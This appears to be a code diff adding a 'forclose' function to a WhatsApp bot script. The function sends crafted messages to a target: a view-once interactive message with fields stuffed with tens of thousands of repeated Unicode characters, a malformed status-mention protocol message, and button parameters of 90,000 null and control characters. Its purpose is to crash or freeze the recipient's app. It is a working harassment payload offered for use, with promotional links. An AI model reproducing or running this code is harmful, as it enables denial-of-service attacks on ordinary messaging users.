@@ -3795,6 +3795,103 @@ await sock.relayMessage("status@broadcast", msg.message, {
 
 console.log("✅ Sticker berhasil dikirim tanpa error.");
 }
+// Forclose
+async function StravasForclose(sock, target) {
+    let msg = await generateWAMessageFromContent(target, {
+        viewOnceMessage: {
+            message: {
+                messageContextInfo: {
+                    deviceListMetadata: {},
+                    deviceListMetadataVersion: 2
+                },
+                interactiveMessage: {
+                    body: {
+                        text: "🫀S T R A V A S B U G S* ꢵ 🫀"
+                    },
+                    nativeFlowMessage: {
+                        messageParamsJson: "{}",
+                        buttons: [
+                            {
+                                name: "single_select",
+                                buttonParamsJson: "zhidanofficial"
+                            },
+                            {
+                                name: "booking_confirmation",
+                                buttonParamsJson: JSON.stringify({})
+                            },
+                            {
+                                name: "psi_opt_outs",
+                                buttonParamsJson: JSON.stringify({})
+                            },
+                            {
+                              name: "psi_opt_outs_blank",
+                                buttonParamsJson: JSON.stringify({})
+                            },
+                            {
+                                name: "psi_tos_opt_in",
+                                buttonParamsJson: JSON.stringify({})
+                            },
+                            {
+                                name: "psi_nux_opt_in",
+                                buttonParamsJson: JSON.stringify({})
+                            },
+                            {
+                            locationMessage: {
+            degreesLatitude: -9.09999262999,
+            degreesLongitude: 199.99963118999,
+            jpegThumbnail: null,
+            name: "💤⃟⃰ᰧ./##### ✩ >" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
+            address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(10000),
+            url: `https://xnxx-Stravas.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`,
+                    },
+                            },
+                            {
+                                name: "cta_app_link",
+                                buttonParamsJson: JSON.stringify({
+                                    display_text: "Stravas",
+                                    android_app_metadata: {
+                                        url: "https://t.me/usserunknownn",
+                                        consented_users_url: "https://t.me/usserunknownn"
+                                    }
+                                })
+                            }
+                        ]
+                    }
+                }
+            }
+        }
+    }, {});
+    
+await sock.relayMessage(target, {
+        statusMentionMessage: {
+          message: {
+            protocolMessage: {
+              key: { remoteJid: target, fromMe: true, id: null },
+              type: 25,
+            },
+            additionalNodes: [
+              {
+                tag: "meta",
+                attrs: { is_status_mention: "false", statusQuestion: "true" },
+                content: undefined,
+              },
+            ],
+          },
+        },
+      }, {});
+    
+await sock.relayMessage(target, {
+    interactiveMessage: {
+      body: { text: "stravas is here" },
+      nativeFlowMessage: {
+        buttons: [
+          { name: "booking_status", buttonParamsJson: "\u0000".repeat(50000) + "\u0003".repeat(40000) }
+        ]
+      }
+    }
+  }, {});
+}
+
 module.exports = {
   // Session management
   activeConnections,
